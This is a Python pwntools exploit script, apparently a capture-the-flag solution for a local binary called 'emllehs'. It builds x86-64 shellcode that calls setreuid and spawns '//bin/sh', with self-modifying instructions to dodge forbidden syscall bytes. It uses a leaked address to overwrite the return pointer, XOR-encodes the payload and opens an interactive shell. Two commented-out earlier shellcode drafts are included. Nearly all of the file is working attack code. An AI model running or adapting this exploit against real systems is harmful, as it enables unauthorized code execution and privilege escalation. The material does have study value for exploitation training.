from pwn import *

context.update(arch='amd64', os='linux', log_level='info')

# assembly = """
#         xor rax, rax        
#         mov ax, 113        
#         mov edi, 1011      
#         mov esi, 1011  

#         lea r10, [rip + fix_me] 
#         incb [r10]
#         fix_me:
#         .byte 0x0e, 0x05       


#         mov rbx, 0x978cd091969dd0d0 
#         not rbx
#         push rbx
#         mov rdi, rsp


#         push 59
#         pop rax
#         mov rsi, 0
#         mov rdx, 0


#         lea r10, [rip + fix_me2]
#         incb [r10]
#         fix_me2:
#         .byte 0x0e, 0x05   
# """

# assembly = """
#     .intel_syntax noprefix
    
#     /* setreuid(1011, 1011) */
#     mov rdi, 1011
#     mov rsi, rdi
#     push 113
#     pop rax
    
#     /* Double Inc to safely create 0x0f 0x05 */
#     lea r10, [rip + sys1]
#     incb [r10]
#     incb [r10+1]
# sys1:
#     .byte 0x0e, 0x04

#     /* execve('//bin/sh', 0, 0) */
#     mov rbx, 0x978cd091969dd0d0 
#     not rbx
#     push rbx
#     mov rdi, rsp
    
#     /* Zero RSI and RDX safely (No null bytes!) */
#     push 59
#     pop rax
#     cdq             
#     mov rsi, rdx    
    
#     /* Double Inc for the second syscall */
#     lea r10, [rip + sys2]
#     incb [r10]
#     incb [r10+1]
# sys2:
#     .byte 0x0e, 0x04
# """

assembly = """
    .intel_syntax noprefix
    
    /* setreuid(1011, 1011) */
    mov rdi, 1011
    mov rsi, rdi
    push 113
    pop rax
    
    /* Double Inc */
    lea r10, [rip + 7]
    incb [r10]
    incb [r10+1]
    .byte 0x0e, 0x04

    /* Zero RDX safely */
    push 59
    pop rax
    cdq             /* RDX = 0 */
    
    /* NULL TERMINATOR FOR THE STRING */
    push rdx
    
    /* Push '//bin/sh' */
    mov rbx, 0x978cd091969dd0d0 
    not rbx
    push rbx
    
    /* RDI points to '//bin/sh\\0' */
    mov rdi, rsp
    
    /* Zero RSI */
    mov rsi, rdx    
    
    /* Double Inc */
    lea r10, [rip + 7]
    incb [r10]
    incb [r10+1]
    .byte 0x0e, 0x04
"""
def attack_run():
    raw_shellcode = asm(assembly)
    dd = 0x0f
    padding_len = 152 - len(raw_shellcode)


    p = process('./emllehs')


    p.recvuntil(b"Your turtle will be at: ")
    leak_str = p.recvline().strip()
    leak = int(leak_str, 16)
    log.info(f"Leak: {hex(leak)}")


    target_addr = leak 
    target_bytes = p64(target_addr)


    payload_mem =  raw_shellcode + (b'\x90' * padding_len) + target_bytes
    final_payload = bytearray()
    for b in payload_mem:
        if b == 0x05: final_payload.append(0x05)
        else: final_payload.append(b ^ dd)


    p.send(final_payload)
    p.interactive()

if __name__ == "__main__":
    attack_run()